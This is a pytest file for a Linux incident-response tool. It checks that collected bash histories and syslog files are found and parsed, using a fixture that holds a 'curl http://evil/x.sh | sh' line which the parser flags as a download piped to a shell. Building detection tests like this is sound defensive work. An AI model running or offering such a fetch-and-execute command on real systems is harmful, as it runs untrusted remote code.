"""Collection-format (CylR/triage) discovery: per-host syslog.log + bash_history/<user>."""

from __future__ import annotations

from linuxir.adapters import disk, logs
from linuxir.adapters.discover import discover


def _make_collection(tmp_path):
    host = tmp_path / "WEB-01.example.local"
    (host / "bash_history").mkdir(parents=True)
    (host / "bash_history" / "alice.bash_history").write_text("id\nwhoami\n")
    (host / "bash_history" / "root.bash_history").write_text("curl http://evil/x.sh | sh\n")
    (host / "syslog.log").write_text(
        "Apr 14 19:42:03 web sshd[1]: Accepted password for alice from 1.2.3.4 port 22 ssh2\n"
        "Apr 14 19:43:00 web sudo:   alice : TTY=pts/0 ; COMMAND=/bin/bash\n")
    return tmp_path


def test_discover_finds_collection_files(tmp_path):
    _make_collection(tmp_path)
    bh = discover([tmp_path], ("*.bash_history",))
    assert len(bh) == 2
    sl = discover([tmp_path], ("syslog.log",))
    assert len(sl) == 1


def test_bash_history_collection_layout(tmp_path):
    _make_collection(tmp_path)
    out = disk.parse_bash_history([tmp_path])
    assert "alice.bash_history" in out and "root.bash_history" in out
    assert "download piped directly to shell" in out  # curl | sh flagged


def test_auth_parsed_from_syslog_log(tmp_path):
    # No var/log/auth.log here — auth events live in <host>/syslog.log.
    _make_collection(tmp_path)
    out = logs.parse_auth([tmp_path])
    assert "Accepted password for alice from 1.2.3.4" in out
    assert "COMMAND=/bin/bash" in out  # sudo escalation picked up


def test_standard_layout_still_works(tmp_path):
    # Regression: the classic mounted-tree layout must still be found.
    (tmp_path / "var/log").mkdir(parents=True)
    (tmp_path / "var/log/auth.log").write_text(
        "Jun  3 02:11:48 h sshd[1]: Accepted password for victim from 9.9.9.9 port 1 ssh2\n")
    assert "victim from 9.9.9.9" in logs.parse_auth([tmp_path])
